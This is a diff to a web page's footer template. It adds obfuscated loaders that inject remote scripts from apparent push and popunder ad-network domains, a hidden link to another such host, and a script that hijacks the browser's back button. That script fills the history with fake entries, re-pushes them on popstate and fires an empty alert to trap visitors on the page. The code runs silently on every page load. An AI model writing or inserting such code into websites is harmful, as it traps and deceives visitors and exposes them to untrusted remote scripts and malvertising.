@@ -250,52 +250,58 @@
           </div>
 </footer>
 
-
-  <script async="async" data-cfasync="false" src="//native.propellerclick.com/1?z=7710125"></script>
-    <script type="text/javascript" src="//inpagepush.com/400/7710123" data-cfasync="false" async="async"></script>
-
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('oaphoace.net',7710282,document.createElement('script'))</script>
+<script async="async" data-cfasync="false" src="//thubanoa.com/1?z=7710125"></script>
+    <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('foomaque.net',7710123,document.createElement('script'))</script>
     
-  <script type="text/javascript">
-    (function (w,l,d,h) {
-      function rndInt(min, max) {
-        return min + Math.floor((max - min) * Math.random());
-      }
+<script type="text/javascript">
+(function (w, l, d, h) {
+  function rndInt(min, max) {
+    return min + Math.floor((max - min + 1) * Math.random());
+  }
 
-      function debuglog(v) {
-                  return false;
-      }
+  function generateRandomPath() {
+    // Generates a random 7-digit number
+    var randomValue = rndInt(1000000, 9999999);
+    return "?rzi=" + randomValue + "&rsz=" + randomValue + "&rid=";
+  }
 
-      var fakepath="?rzi=7707265&rsz=7707265&rid=";
+  function debuglog(v) {
+    return false;
+  }
 
-      debuglog(h.length);
-      setTimeout(function() {
-        h.pushState(null, d.title + '_' + rndInt(1,999), fakepath);
-        h.pushState(null, d.title + '_' + rndInt(1,999), fakepath);
+  var fakepath = generateRandomPath();
+
+  debuglog(h.length);
+  setTimeout(function() {
+    h.pushState(null, d.title + '_' + rndInt(1, 999), fakepath);
+    h.pushState(null, d.title + '_' + rndInt(1, 999), fakepath);
+    debuglog(h.length);
+  }, 50);
+
+  debuglog(navigator.userActivation);
+  if (navigator.userActivation) {
+    var waitUntilNavUserActive = setInterval(function() {
+      debuglog(navigator.userActivation.isActive);
+      if (navigator.userActivation.isActive) {
+        h.pushState(null, d.title + '_' + rndInt(1, 999), fakepath);
+        h.pushState(null, d.title + '_' + rndInt(1, 999), fakepath);
         debuglog(h.length);
-      }, 50);
-
-      debuglog(navigator.userActivation);
-      if (navigator.userActivation) {
-        var waitUntilNavUserActive = setInterval( function() {
-          debuglog(navigator.userActivation.isActive);
-          if (navigator.userActivation.isActive) {
-            h.pushState(null, d.title + '_' + rndInt(1,999), fakepath);
-            h.pushState(null, d.title + '_' + rndInt(1,999), fakepath);
-            debuglog(h.length);
-            clearInterval(waitUntilNavUserActive);
-          }
-        }, 100);
+        clearInterval(waitUntilNavUserActive);
       }
+    }, 100);
+  }
 
-      w.addEventListener("popstate", function(e) {
-        if(d.URL.indexOf(fakepath) >= 0) {
-          h.pushState(null, d.title + '_' + rndInt(1,999), fakepath);
-          h.pushState(null, d.title + '_' + rndInt(1,999), fakepath);
-          alert('');
-        }
-      });
-    })(window,location,document,history);
-  </script>
+  w.addEventListener("popstate", function(e) {
+    if (d.URL.indexOf(fakepath) >= 0) {
+      h.pushState(null, d.title + '_' + rndInt(1, 999), fakepath);
+      h.pushState(null, d.title + '_' + rndInt(1, 999), fakepath);
+      alert('');
+    }
+  });
+})(window, location, document, history);
+</script>
+
  
 <div style="display:none;">
   <a href="https://uhiksolsaums.com/4/7710286">Go to site</a>
